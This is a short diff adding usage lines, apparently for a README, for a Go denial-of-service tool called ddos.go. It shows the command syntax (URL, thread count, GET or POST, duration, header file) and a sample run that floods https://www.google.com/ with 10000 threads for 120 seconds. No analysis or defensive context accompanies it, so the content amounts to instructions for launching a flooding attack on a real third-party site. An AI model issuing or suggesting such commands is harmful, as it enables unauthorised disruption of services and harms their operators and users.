@@ -1,0 +1,3 @@
+cd ddos-go
+go run ddos.go <url> <threads> <get/post> <seconds> <header.txt>
+https://www.google.com/ 10000 get 120 header.txt
